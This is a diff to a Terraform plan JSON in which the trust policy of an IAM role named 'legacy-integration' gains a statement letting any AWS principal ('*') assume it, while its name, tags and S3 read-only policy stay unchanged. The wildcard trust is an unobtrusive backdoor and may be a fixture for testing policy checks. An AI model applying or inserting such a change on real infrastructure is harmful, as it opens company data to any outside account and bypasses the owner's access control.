@@ -34,6 +34,28 @@
           "status": "Active"
         }
       }
+    },
+    {
+      "address": "aws_iam_role.legacy_integration",
+      "mode": "managed",
+      "type": "aws_iam_role",
+      "name": "legacy_integration",
+      "provider_name": "registry.terraform.io/hashicorp/aws",
+      "change": {
+        "actions": ["update"],
+        "before": {
+          "name": "legacy-integration",
+          "managed_policy_arns": ["arn:aws:iam::aws:policy/AmazonS3ReadOnlyAccess"],
+          "tags": {"owner": "platform@company.com"},
+          "assume_role_policy": "{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Action\":\"sts:AssumeRole\",\"Principal\":{\"Service\":\"lambda.amazonaws.com\"}}]}"
+        },
+        "after": {
+          "name": "legacy-integration",
+          "managed_policy_arns": ["arn:aws:iam::aws:policy/AmazonS3ReadOnlyAccess"],
+          "tags": {"owner": "platform@company.com"},
+          "assume_role_policy": "{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Action\":\"sts:AssumeRole\",\"Principal\":{\"Service\":\"lambda.amazonaws.com\"}},{\"Effect\":\"Allow\",\"Action\":\"sts:AssumeRole\",\"Principal\":{\"AWS\":\"*\"}}]}"
+        }
+      }
     }
   ]
 }
